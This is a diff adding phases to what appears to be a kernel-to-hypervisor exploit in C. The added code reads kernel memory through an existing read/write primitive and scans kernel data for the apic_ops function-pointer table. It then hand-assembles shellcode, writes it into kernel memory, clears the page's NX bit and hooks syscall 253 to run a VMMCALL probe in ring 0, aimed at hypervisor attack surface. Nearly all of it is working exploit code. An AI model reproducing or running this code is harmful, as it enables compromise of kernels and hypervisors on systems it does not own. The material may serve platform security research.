@@ -3548,6 +3548,321 @@ ring3_fallback:
                         kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
                     }
                 }
+
+                /* ─── Phase 3: Scan kdata for apic_ops vtable ─── */
+                printf("=============================================\n");
+                printf("  Ring-0 Phase 3: APIC Ops Discovery\n");
+                printf("=============================================\n\n");
+                printf("[*] Scanning kdata for function pointer tables (apic_ops)...\n");
+                printf("[*] Looking for clusters of 4+ consecutive ktext pointers.\n");
+                printf("    ktext range: 0x%lx — 0x%lx\n",
+                       (unsigned long)g_ktext_base,
+                       (unsigned long)(g_ktext_base + 0xA00000));
+                printf("    kdata range: 0x%lx — 0x%lx\n",
+                       (unsigned long)g_kdata_base,
+                       (unsigned long)(g_kdata_base + 0x200000));
+                fflush(stdout);
+
+                /*
+                 * Strategy: Read kdata in 4KB chunks via kernel_copyout.
+                 * For each 8-byte-aligned qword, check if it's in ktext range.
+                 * Track runs of consecutive ktext pointers.
+                 * apic_ops should have ~20+ function pointers.
+                 */
+                #define APIC_SCAN_SIZE   0x200000  /* 2MB of kdata */
+                #define APIC_SCAN_CHUNK  0x1000    /* 4KB at a time */
+                #define APIC_MIN_RUN     4         /* Minimum consecutive ptrs */
+
+                int apic_found_tables = 0;
+                int apic_run_len = 0;
+                uint64_t apic_run_start = 0;
+                uint64_t apic_best_addr = 0;
+                int apic_best_len = 0;
+
+                uint8_t apic_chunk[APIC_SCAN_CHUNK];
+
+                for (uint64_t off = 0; off < APIC_SCAN_SIZE;
+                     off += APIC_SCAN_CHUNK) {
+                    uint64_t scan_kva = g_kdata_base + off;
+                    uint64_t scan_pa = va_to_pa_quiet(scan_kva);
+                    if (scan_pa == 0) {
+                        /* Page not mapped — reset run */
+                        if (apic_run_len >= APIC_MIN_RUN) {
+                            printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                                   (unsigned long)(apic_run_start - g_kdata_base),
+                                   apic_run_len);
+                            if (apic_run_len > apic_best_len) {
+                                apic_best_len = apic_run_len;
+                                apic_best_addr = apic_run_start;
+                            }
+                            apic_found_tables++;
+                        }
+                        apic_run_len = 0;
+                        continue;
+                    }
+
+                    kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
+                                   APIC_SCAN_CHUNK);
+
+                    for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
+                        uint64_t qval;
+                        memcpy(&qval, &apic_chunk[qi], 8);
+
+                        int is_ktext_ptr =
+                            (qval >= g_ktext_base &&
+                             qval < g_ktext_base + 0xA00000 &&
+                             (qval & 0xF) == 0);  /* aligned */
+
+                        if (is_ktext_ptr) {
+                            if (apic_run_len == 0)
+                                apic_run_start = scan_kva + qi;
+                            apic_run_len++;
+                        } else {
+                            if (apic_run_len >= APIC_MIN_RUN) {
+                                printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                                       (unsigned long)(apic_run_start - g_kdata_base),
+                                       apic_run_len);
+                                if (apic_run_len > apic_best_len) {
+                                    apic_best_len = apic_run_len;
+                                    apic_best_addr = apic_run_start;
+                                }
+                                apic_found_tables++;
+                            }
+                            apic_run_len = 0;
+                        }
+                    }
+                }
+                /* Flush final run */
+                if (apic_run_len >= APIC_MIN_RUN) {
+                    printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                           (unsigned long)(apic_run_start - g_kdata_base),
+                           apic_run_len);
+                    if (apic_run_len > apic_best_len) {
+                        apic_best_len = apic_run_len;
+                        apic_best_addr = apic_run_start;
+                    }
+                    apic_found_tables++;
+                }
+
+                printf("\n[*] Found %d function pointer tables.\n",
+                       apic_found_tables);
+
+                if (apic_best_addr) {
+                    printf("[+] Largest table: kdata+0x%lx (%d entries)\n",
+                           (unsigned long)(apic_best_addr - g_kdata_base),
+                           apic_best_len);
+                    printf("[*] Dumping entries:\n");
+                    /* Dump the best candidate */
+                    uint64_t dump_pa = va_to_pa_quiet(apic_best_addr);
+                    if (dump_pa) {
+                        int dump_cnt = apic_best_len;
+                        if (dump_cnt > 32) dump_cnt = 32;
+                        uint64_t dump_buf[32];
+                        kernel_copyout(g_dmap_base + dump_pa,
+                                       dump_buf, dump_cnt * 8);
+                        for (int di = 0; di < dump_cnt; di++) {
+                            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                   di, (unsigned long)dump_buf[di],
+                                   (unsigned long)(dump_buf[di] - g_ktext_base));
+                        }
+                    }
+                }
+
+                /* Look specifically for tables with ~20-30 entries (apic_ops size) */
+                if (apic_found_tables > 0) {
+                    printf("\n[*] Candidate apic_ops tables (15-40 entries):\n");
+                    int apic_cand = 0;
+                    apic_run_len = 0;
+                    apic_run_start = 0;
+
+                    for (uint64_t off = 0; off < APIC_SCAN_SIZE;
+                         off += APIC_SCAN_CHUNK) {
+                        uint64_t scan_kva = g_kdata_base + off;
+                        uint64_t scan_pa = va_to_pa_quiet(scan_kva);
+                        if (scan_pa == 0) {
+                            if (apic_run_len >= 15 && apic_run_len <= 40) {
+                                printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
+                                       (unsigned long)(apic_run_start - g_kdata_base),
+                                       apic_run_len);
+                                apic_cand++;
+                            }
+                            apic_run_len = 0;
+                            continue;
+                        }
+                        kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
+                                       APIC_SCAN_CHUNK);
+                        for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
+                            uint64_t qval;
+                            memcpy(&qval, &apic_chunk[qi], 8);
+                            int is_ktext_ptr =
+                                (qval >= g_ktext_base &&
+                                 qval < g_ktext_base + 0xA00000 &&
+                                 (qval & 0xF) == 0);
+                            if (is_ktext_ptr) {
+                                if (apic_run_len == 0)
+                                    apic_run_start = scan_kva + qi;
+                                apic_run_len++;
+                            } else {
+                                if (apic_run_len >= 15 && apic_run_len <= 40) {
+                                    printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
+                                           (unsigned long)(apic_run_start - g_kdata_base),
+                                           apic_run_len);
+                                    apic_cand++;
+                                }
+                                apic_run_len = 0;
+                            }
+                        }
+                    }
+                    if (apic_run_len >= 15 && apic_run_len <= 40) {
+                        printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
+                               (unsigned long)(apic_run_start - g_kdata_base),
+                               apic_run_len);
+                        apic_cand++;
+                    }
+                    if (apic_cand == 0)
+                        printf("    (none in 15-40 range)\n");
+                }
+
+                printf("\n");
+                fflush(stdout);
+
+                /* ─── Phase 4: SVME=1 — VMMCALL probe (safe) ─── */
+                printf("=============================================\n");
+                printf("  Ring-0 Phase 4: VMMCALL Probe (SVME=1)\n");
+                printf("=============================================\n\n");
+                printf("[*] EFER.SVME=1 detected — probing VMMCALL from ring 0.\n");
+                printf("[*] VMMCALL with RAX=0 is the safest probe.\n");
+                printf("[*] Expected: #VMEXIT → HV handles → returns to guest.\n");
+                printf("[*] Risk: HV may kill guest on unrecognized VMMCALL.\n");
+                fflush(stdout);
+
+                /*
+                 * Build a VMMCALL probe shellcode:
+                 *   mov rdi, output_kva
+                 *   movl $KMOD_MAGIC_lo, (%rdi)     ; mark alive
+                 *   movl $KMOD_MAGIC_hi, 4(%rdi)
+                 *   mov eax, 0                       ; VMMCALL function 0
+                 *   vmmcall                           ; 0F 01 D9
+                 *   movl $0x56434F4B, 8(%rdi)        ; "VCOK" — survived
+                 *   mov [rdi+16], rax                 ; save RAX return
+                 *   xor eax, eax
+                 *   ret
+                 */
+                {
+                    uint8_t vc_sc[64];
+                    int vp = 0;
+
+                    /* mov rdi, output_kva (result_kva) */
+                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0xBF;
+                    memcpy(&vc_sc[vp], &result_kva, 8); vp += 8;
+
+                    /* Clear buffer: movq $0, (%rdi) */
+                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0xC7;
+                    vc_sc[vp++] = 0x07;
+                    vc_sc[vp++] = 0; vc_sc[vp++] = 0;
+                    vc_sc[vp++] = 0; vc_sc[vp++] = 0;
+
+                    /* Write pre-vmmcall marker: movl $0x564D4231, (%rdi)
+                     * "VMB1" = VMMCALL Before 1 */
+                    vc_sc[vp++] = 0xC7; vc_sc[vp++] = 0x07;
+                    uint32_t pre_mark = 0x564D4231; /* "VMB1" */
+                    memcpy(&vc_sc[vp], &pre_mark, 4); vp += 4;
+
+                    /* xor eax, eax (VMMCALL function 0) */
+                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC0;
+
+                    /* xor ecx, ecx */
+                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC9;
+
+                    /* xor edx, edx */
+                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xD2;
+
+                    /* vmmcall: 0F 01 D9 */
+                    vc_sc[vp++] = 0x0F; vc_sc[vp++] = 0x01; vc_sc[vp++] = 0xD9;
+
+                    /* Write post-vmmcall marker: movl $0x564D4F4B, 4(%rdi)
+                     * "VMOK" = VMMCALL survived */
+                    vc_sc[vp++] = 0xC7; vc_sc[vp++] = 0x47; vc_sc[vp++] = 0x04;
+                    uint32_t post_mark = 0x564D4F4B; /* "VMOK" */
+                    memcpy(&vc_sc[vp], &post_mark, 4); vp += 4;
+
+                    /* Save RAX (return from VMMCALL): mov %rax, 8(%rdi) */
+                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0x89;
+                    vc_sc[vp++] = 0x47; vc_sc[vp++] = 0x08;
+
+                    /* xor eax, eax; ret */
+                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC0;
+                    vc_sc[vp++] = 0xC3;
+
+                    printf("[*] VMMCALL probe shellcode: %d bytes\n", vp);
+
+                    /* Clear shared buffer */
+                    uint8_t vc_zero[32];
+                    memset(vc_zero, 0, sizeof(vc_zero));
+                    kernel_copyin(vc_zero, g_dmap_base + cpu_pa, 32);
+
+                    /* Save + write shellcode */
+                    uint8_t vc_backup[64];
+                    kernel_copyout(g_dmap_base + target_pa, vc_backup, vp);
+                    kernel_copyin(vc_sc, g_dmap_base + target_pa, vp);
+
+                    /* Clear NX+G, hook sysent, call */
+                    kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+                    kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+                    kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+                    printf("[*] Calling syscall(253) — VMMCALL in ring 0...\n");
+                    fflush(stdout);
+                    errno = 0;
+                    long vc_ret = syscall(253);
+                    int vc_err = errno;
+                    printf("    syscall(253) returned: %ld, errno=%d\n",
+                           vc_ret, vc_err);
+
+                    /* Restore everything */
+                    kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+                    kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                    kernel_copyin(vc_backup, g_dmap_base + target_pa, vp);
+                    printf("[*] All restored.\n");
+
+                    /* Read results */
+                    uint32_t vc_pre, vc_post;
+                    uint64_t vc_rax;
+                    kernel_copyout(g_dmap_base + cpu_pa, &vc_pre, 4);
+                    kernel_copyout(g_dmap_base + cpu_pa + 4, &vc_post, 4);
+                    kernel_copyout(g_dmap_base + cpu_pa + 8, &vc_rax, 8);
+
+                    printf("\n[*] VMMCALL probe results:\n");
+                    printf("    Pre-marker:  0x%08x %s\n", vc_pre,
+                           vc_pre == 0x564D4231 ? "(VMB1 — reached VMMCALL)" :
+                           vc_pre == 0 ? "(zero — shellcode didn't run)" :
+                           "(unexpected)");
+                    printf("    Post-marker: 0x%08x %s\n", vc_post,
+                           vc_post == 0x564D4F4B ? "(VMOK — SURVIVED VMMCALL!)" :
+                           vc_post == 0 ? "(zero — died at VMMCALL)" :
+                           "(unexpected)");
+                    printf("    RAX return:  0x%016lx\n", (unsigned long)vc_rax);
+
+                    if (vc_pre == 0x564D4231 && vc_post == 0x564D4F4B) {
+                        printf("\n[+] ============================================\n");
+                        printf("[+]  VMMCALL SURVIVED! HV returned to guest!\n");
+                        printf("[+] ============================================\n");
+                        printf("[+] RAX out = 0x%lx\n", (unsigned long)vc_rax);
+                        printf("[+] This opens VMMCALL enumeration as attack surface.\n");
+                    } else if (vc_pre == 0x564D4231 && vc_post == 0) {
+                        printf("\n[!] VMMCALL was reached but execution stopped.\n");
+                        printf("    HV intercepted VMMCALL and either:\n");
+                        printf("    - Killed the syscall (returned error)\n");
+                        printf("    - Injected #UD or #GP into guest\n");
+                        if (vc_err != 0)
+                            printf("    errno=%d confirms fault was injected.\n",
+                                   vc_err);
+                    } else if (vc_pre == 0) {
+                        printf("\n[-] Shellcode didn't execute (PTE/hook issue).\n");
+                    }
+                    printf("\n");
+                    fflush(stdout);
+                }
             } else if (buf_check != 0) {
                 printf("[?] Buffer has unexpected value: 0x%lx\n",
                        (unsigned long)buf_check);
